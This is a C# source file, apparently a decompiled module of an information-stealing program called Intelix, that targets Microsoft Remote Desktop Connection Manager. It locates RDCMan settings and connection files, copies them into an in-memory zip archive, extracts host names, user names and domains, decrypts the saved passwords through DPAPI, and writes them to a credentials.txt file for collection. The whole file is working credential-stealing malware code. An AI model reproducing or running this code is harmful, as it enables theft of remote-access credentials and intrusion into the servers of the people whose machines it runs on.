using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Applications;

public class RDCMan : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Remote Desktop Connection Manager", "RDCMan.settings");
		if (!File.Exists(path))
		{
			return;
		}
		List<string> list = new List<string>();
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.LoadXml(File.ReadAllText(path));
		XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//FilesToOpen");
		if (xmlNodeList != null)
		{
			foreach (XmlNode item in xmlNodeList)
			{
				string innerText = item.InnerText;
				if (!string.IsNullOrEmpty(innerText) && !list.Contains(innerText))
				{
					list.Add(innerText);
				}
			}
		}
		if (!list.Any())
		{
			return;
		}
		Counter.CounterApplications counterApplications = new Counter.CounterApplications();
		counterApplications.Name = "RDCMan";
		StringBuilder stringBuilder = new StringBuilder();
		foreach (string item2 in list)
		{
			if (!File.Exists(item2))
			{
				continue;
			}
			string text = "RDCMan\\" + Path.GetFileName(item2);
			zip.AddFile(text, File.ReadAllBytes(item2));
			counterApplications.Files.Add(item2 + " => " + text);
			XmlDocument xmlDocument2 = new XmlDocument();
			xmlDocument2.LoadXml(File.ReadAllText(item2));
			XmlNodeList xmlNodeList2 = xmlDocument2.SelectNodes("//server");
			if (xmlNodeList2 == null || xmlNodeList2.Count == 0)
			{
				continue;
			}
			stringBuilder.AppendLine("SourceFile: " + item2);
			stringBuilder.AppendLine($"Found servers: {xmlNodeList2.Count}");
			stringBuilder.AppendLine();
			foreach (XmlNode item3 in xmlNodeList2)
			{
				string text2 = string.Empty;
				string text3 = string.Empty;
				string text4 = string.Empty;
				string text5 = string.Empty;
				string text6 = string.Empty;
				foreach (XmlNode item4 in item3)
				{
					foreach (XmlNode item5 in item4)
					{
						switch (item5.Name)
						{
						case "name":
							text2 = item5.InnerText;
							break;
						case "profileName":
							text3 = item5.InnerText;
							break;
						case "userName":
							text4 = item5.InnerText;
							break;
						case "password":
							text5 = item5.InnerText;
							break;
						case "domain":
							text6 = item5.InnerText;
							break;
						}
					}
				}
				if (!string.IsNullOrEmpty(text5))
				{
					string text7 = DecryptPassword(text5);
					stringBuilder.AppendLine("----");
					stringBuilder.AppendLine("HostName: " + text2);
					stringBuilder.AppendLine("ProfileName: " + text3);
					stringBuilder.AppendLine("UserName: " + (string.IsNullOrEmpty(text6) ? text4 : (text6 + "\\" + text4)));
					stringBuilder.AppendLine("DecryptedPassword: " + text7);
					stringBuilder.AppendLine();
				}
			}
			string text8 = "RDCMan\\" + Path.GetFileName(item2) + "\\credentials.txt";
			zip.AddTextFile(text8, stringBuilder.ToString());
			counterApplications.Files.Add(text8 ?? "");
		}
		if (counterApplications.Files.Count > 0)
		{
			counterApplications.Files.Add("RDCMan\\");
			counter.Applications.Add(counterApplications);
		}
	}

	private string DecryptPassword(string password)
	{
		byte[] array = DpApi.Decrypt(Convert.FromBase64String(password));
		if (array == null)
		{
			return string.Empty;
		}
		return Encoding.UTF8.GetString(array).TrimEnd(default(char));
	}
}
